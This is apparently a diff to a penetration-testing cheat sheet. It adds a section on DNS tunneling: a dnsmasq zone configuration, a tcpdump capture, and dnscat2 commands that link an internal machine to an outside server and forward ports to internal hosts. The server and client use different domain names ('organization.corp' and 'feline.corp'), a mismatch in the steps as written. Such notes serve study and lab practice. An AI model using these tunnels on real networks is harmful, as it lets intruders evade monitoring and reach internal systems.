@@ -143,7 +143,8 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [ssh.exe](#sshexe)
     - [Plink.exe](#plinkexe)
     - [Netsh](#netsh)
-    - [HTTP Tunneling](#http-tunneling)  
+    - [HTTP Tunneling](#http-tunneling)
+    - [DNS Tunneling](#dns-tunneling)
   - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [Resources](#resources-1)
     - [Strategy](#strategy)
@@ -3721,6 +3722,33 @@ The first time plink connects to a host, it will attempt to cache the host key i
      - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
      - `%h` and `%p` tokens represent the SSH command host and port values
    - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run
+
+### <ins>DNS Tunneling</ins>
+
+#### Dnsmasq to setup a DNS resolver
+1. Setup: `WAN`, `DMZ` and `INTERNAL`
+2. From a machine inside `WAN`, setup a DNS server by using a software like [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)
+   - `sudo dnsmasq -C dnsmasq.conf -d`. An example of configuration (see also [dnsmasq.conf.example](https://github.com/PowerDNS/dnsmasq/blob/master/dnsmasq.conf.example)):
+     ```
+     # Do not read /etc/resolv.conf or /etc/hosts
+     no-resolv
+     no-hosts
+
+     # Define the zone
+     auth-zone=organization.corp
+     auth-server=organization.corp
+
+     # TXT record
+     txt-record=www.organization.corp,some info.
+     txt-record=www.organization.corp,some other info.
+     ```
+   - `sudo tcpdump -i ens192 udp port 53`
+
+#### [dnscat2](https://github.com/iagox86/dnscat2)
+1. Setup: `WAN`, `DMZ` and `INTERNAL`
+2. Start `dnscat2-server organization.corp` from `WAN` and connect from `INTERNAL` to it with `./dnscat feline.corp`
+3. From `dnscat2-server` > `window -i 1` > `listen 127.0.0.1:<lister-PORT> <IP>:<PORT>`
+   - `<IP>:<PORT>` = machine from `INTERNAL` 
 
 
 ### <ins>Linux Privilege Escalation</ins>
